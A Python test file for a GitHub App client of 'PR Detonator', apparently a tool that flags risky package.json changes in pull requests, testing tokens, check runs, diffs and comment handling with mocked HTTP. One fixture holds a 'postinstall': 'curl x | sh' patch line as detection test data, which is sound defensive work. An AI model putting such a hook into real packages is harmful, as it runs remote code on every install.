import json

import httpx
import jwt
import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from brain.github_client import (
    COMMENT_MARKER,
    MAX_DIFF_CHARS,
    ChangedFile,
    GitHubClient,
    load_private_key,
    scripts_changed,
)


@pytest.fixture(scope="module")
def keypair():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    return pem, key.public_key()


def make_client(pem, handler) -> GitHubClient:
    http = httpx.Client(base_url="https://api.github.test", transport=httpx.MockTransport(handler))
    return GitHubClient("4242", pem, http=http)


def test_app_jwt_claims(keypair):
    pem, public = keypair
    client = make_client(pem, lambda r: httpx.Response(500))
    token = client.app_jwt(now=1_700_000_000)
    claims = jwt.decode(token, public, algorithms=["RS256"], options={"verify_exp": False})
    assert claims == {"iat": 1_700_000_000 - 60, "exp": 1_700_000_000 + 540, "iss": "4242"}


def test_escaped_newline_pem_loads(keypair):
    pem, _ = keypair
    assert load_private_key(pem.replace("\n", "\\n")) == pem.strip() + "\n"


def test_installation_token_cached(keypair):
    pem, _ = keypair
    calls = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(request)
        assert request.headers["Authorization"].startswith("Bearer ")
        return httpx.Response(201, json={"token": "ghs_x", "expires_at": "2999-01-01T00:00:00Z"})

    client = make_client(pem, handler)
    assert client.installation_token(1) == "ghs_x"
    assert client.installation_token(1) == "ghs_x"
    assert len(calls) == 1


def test_expiring_token_refreshed(keypair):
    pem, _ = keypair
    calls = []

    def handler(request):
        calls.append(request)
        return httpx.Response(201, json={"token": "ghs_x", "expires_at": "2000-01-01T00:00:00Z"})

    client = make_client(pem, handler)
    client.installation_token(1)
    client.installation_token(1)
    assert len(calls) == 2


def routed(routes: dict):
    """MockTransport handler: token endpoint + exact (method, path) routes."""

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/access_tokens"):
            return httpx.Response(
                201, json={"token": "ghs_x", "expires_at": "2999-01-01T00:00:00Z"}
            )
        assert request.headers["Authorization"] == "token ghs_x"
        return routes[(request.method, request.url.path)](request)

    return handler


def test_create_and_complete_check_run(keypair):
    pem, _ = keypair
    seen = {}

    def create(request):
        seen["create"] = json.loads(request.content)
        return httpx.Response(201, json={"id": 99})

    def complete(request):
        seen["complete"] = json.loads(request.content)
        return httpx.Response(200, json={})

    client = make_client(
        pem,
        routed(
            {
                ("POST", "/repos/o/r/check-runs"): create,
                ("PATCH", "/repos/o/r/check-runs/99"): complete,
            }
        ),
    )
    check_id = client.create_check_run(1, "o", "r", "abc", details_url="https://x/pull/7")
    assert check_id == 99
    assert seen["create"]["name"] == "PR Detonator"
    assert seen["create"]["details_url"] == "https://x/pull/7"
    assert seen["create"]["status"] == "in_progress"
    assert seen["create"]["head_sha"] == "abc"

    client.complete_check_run(1, "o", "r", 99, "failure", "Blocked", "x" * 70_000)
    assert seen["complete"]["conclusion"] == "failure"
    assert seen["complete"]["status"] == "completed"
    assert len(seen["complete"]["output"]["summary"]) < 65_536


def test_diff_truncated(keypair):
    pem, _ = keypair

    def diff(request):
        assert request.headers["Accept"] == "application/vnd.github.diff"
        return httpx.Response(200, text="+" * (MAX_DIFF_CHARS + 500))

    client = make_client(pem, routed({("GET", "/repos/o/r/pulls/7"): diff}))
    text = client.get_pr_diff(1, "o", "r", 7)
    assert text.startswith("+" * MAX_DIFF_CHARS)
    assert "truncated 500 chars" in text


def test_pr_metadata(keypair):
    pem, _ = keypair
    files = [
        {"filename": "README.md", "status": "modified", "patch": "-teh\n+the"},
        {
            "filename": "package.json",
            "status": "modified",
            "patch": '@@ -1 +1 @@\n   "scripts": {\n+    "postinstall": "curl x | sh"',
        },
    ]
    client = make_client(
        pem,
        routed(
            {
                ("GET", "/repos/o/r/pulls/7"): lambda r: httpx.Response(
                    200, json={"title": "Fix typo", "body": "b" * 5000, "user": {"login": "eve"}}
                ),
                ("GET", "/repos/o/r/pulls/7/files"): lambda r: httpx.Response(200, json=files),
            }
        ),
    )
    meta = client.get_pr_metadata(1, "o", "r", 7)
    assert meta.title == "Fix typo" and meta.author == "eve"
    assert meta.changed_files == ["README.md", "package.json"]
    assert meta.package_json_changed and meta.scripts_changed and not meta.lockfile_changed
    assert len(meta.body) < 2100


def test_scripts_changed_ignores_dependency_only_edits():
    f = ChangedFile(
        filename="package.json",
        status="modified",
        patch='@@\n   "dependencies": {\n+    "lodash": "^4.17.21"',
    )
    assert not scripts_changed([f])


def test_comment_gets_marker(keypair):
    pem, _ = keypair
    seen = {}

    def post(request):
        seen["body"] = json.loads(request.content)["body"]
        return httpx.Response(201, json={"id": 5})

    client = make_client(pem, routed({("POST", "/repos/o/r/issues/7/comments"): post}))
    client.post_comment(1, "o", "r", 7, "hello")
    assert seen["body"].endswith("<!-- pr-detonator -->")


def test_create_review_puts_inline_comments_on_the_head_side(keypair):
    pem, _ = keypair
    seen = {}

    def review(request):
        seen.update(json.loads(request.content))
        return httpx.Response(200, json={"id": 77})

    client = make_client(pem, routed({("POST", "/repos/o/r/pulls/5/reviews"): review}))
    comments = [{"path": "package.json", "line": 5, "body": "x"}]
    assert client.create_review(1, "o", "r", 5, "a" * 40, comments) == 77
    assert seen == {
        "commit_id": "a" * 40,
        "event": "COMMENT",
        "comments": [{"path": "package.json", "line": 5, "body": "x", "side": "RIGHT"}],
    }


def _comments_route(existing):
    calls = []

    def list_comments(request):
        calls.append(("GET", request.url.params.get("page")))
        return httpx.Response(200, json=existing)

    def patch(request):
        calls.append(("PATCH", request.url.path))
        return httpx.Response(200, json={"id": 7})

    def post(request):
        calls.append(("POST", request.url.path))
        return httpx.Response(201, json={"id": 99})

    routes = {
        ("GET", "/repos/o/r/issues/5/comments"): list_comments,
        ("PATCH", "/repos/o/r/issues/comments/7"): patch,
        ("POST", "/repos/o/r/issues/5/comments"): post,
    }
    return routed(routes), calls


def test_upsert_edits_our_latest_report_comment(keypair):
    pem, _ = keypair
    older = {"id": 3, "body": f"older\n{COMMENT_MARKER}", "performed_via_github_app": {"id": 4242}}
    ours = {"id": 7, "body": f"old\n{COMMENT_MARKER}", "performed_via_github_app": {"id": 4242}}
    handler, calls = _comments_route([older, ours])
    assert make_client(pem, handler).upsert_comment(1, "o", "r", 5, "new report") == 7
    assert ("PATCH", "/repos/o/r/issues/comments/7") in calls and not any(
        c[0] == "POST" for c in calls
    )


def test_upsert_never_edits_someone_elses_comment_with_our_marker(keypair):
    pem, _ = keypair
    spoof = {"id": 7, "body": f"fake {COMMENT_MARKER}", "performed_via_github_app": None}
    other_app = {"id": 8, "body": COMMENT_MARKER, "performed_via_github_app": {"id": 1}}
    handler, calls = _comments_route([spoof, other_app])
    assert make_client(pem, handler).upsert_comment(1, "o", "r", 5, "new report") == 99
    assert not any(c[0] == "PATCH" for c in calls)


def test_repo_read_token_is_scoped_to_one_repo_and_read_only(keypair):
    pem, _ = keypair
    seen = {}

    def handler(request):
        assert request.headers["Authorization"].startswith("Bearer ")  # app JWT, not a token
        seen.update(json.loads(request.content))
        return httpx.Response(
            201, json={"token": "ghs_scoped", "expires_at": "2999-01-01T00:00:00Z"}
        )

    assert make_client(pem, handler).repo_read_token(1, "r") == "ghs_scoped"
    assert seen == {"repositories": ["r"], "permissions": {"contents": "read"}}


def test_upsert_merge_sees_the_previous_body(keypair):
    pem, _ = keypair
    ours = {"id": 7, "body": f"old\n{COMMENT_MARKER}", "performed_via_github_app": {"id": 4242}}
    handler, _ = _comments_route([ours])
    seen = []

    def merge(prev):
        seen.append(prev)
        return "merged"

    make_client(pem, handler).upsert_comment(1, "o", "r", 5, "new", merge=merge)
    assert seen == [ours["body"]]


def test_get_file_reads_an_exact_ref_and_tolerates_absence(keypair):
    pem, _ = keypair
    seen = {}

    def contents(request):
        seen["ref"] = request.url.params.get("ref")
        seen["accept"] = request.headers.get("Accept")
        return httpx.Response(200, text="needs_review: block\n")

    client = make_client(
        pem, routed({("GET", "/repos/o/r/contents/.github/detonator.yml"): contents})
    )
    text = client.get_file(1, "o", "r", ".github/detonator.yml", "b" * 40)
    assert text == "needs_review: block\n"
    assert seen["ref"] == "b" * 40  # the BASE sha we asked for, never the head
    assert seen["accept"] == "application/vnd.github.raw"

    missing = make_client(
        pem,
        routed(
            {("GET", "/repos/o/r/contents/.github/detonator.yml"): lambda r: httpx.Response(404)}
        ),
    )
    assert missing.get_file(1, "o", "r", ".github/detonator.yml", "b" * 40) is None
